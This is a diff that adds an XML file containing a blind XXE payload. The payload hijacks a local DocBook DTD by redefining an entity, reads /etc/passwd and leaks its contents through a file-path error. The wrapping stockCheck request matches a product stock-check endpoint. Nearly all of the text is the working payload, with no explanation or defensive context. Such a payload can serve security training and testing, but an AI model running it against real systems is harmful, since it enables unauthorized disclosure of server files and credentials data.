@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE recon [
+    <!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+    <!ENTITY % ISOamsa '
+          <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+       <!ENTITY &#x25; wrapper "<!ENTITY &#x26;#x25; pwn SYSTEM &#x27;file:///abc/&#x25;file;&#x27;>">&#x25;wrapper;&#x25;pwn;
+    '>
+    %local;
+]>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>1</storeId>
+</stockCheck>
